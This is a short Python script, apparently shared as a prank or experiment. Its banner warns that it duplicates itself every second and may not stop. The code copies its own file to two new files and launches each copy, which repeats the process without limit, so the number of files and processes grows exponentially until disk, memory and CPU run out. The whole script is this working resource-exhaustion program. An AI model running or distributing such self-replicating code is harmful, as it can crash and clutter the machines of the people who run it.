##############################################################
# WARNING!                                                   #
# This file will DUPLICATE itself over and over every second #
# and the only way to stop is to stop this file,             #
# but it is not 100 percent ure it will stop                 #
# so use this at your own risk!                              #
##############################################################

import os
import time
import threading

file = None

def copy(target, to):
    with open(target, 'rb') as f:
        with open(to, 'wb') as x:
            x.write(f.read())

def e():
    print(f'Cloning file')
    os.system(f'python "{file}"')

thread1 = threading.Thread(target=e)
thread2 = threading.Thread(target=e)

file = f'{__file__[:-3]}1.py'
copy(__file__, file)
time.sleep(1)
thread1.start()

file = f'{__file__[:-3]}2.py'
copy(__file__, file)
time.sleep(1)
thread2.start()
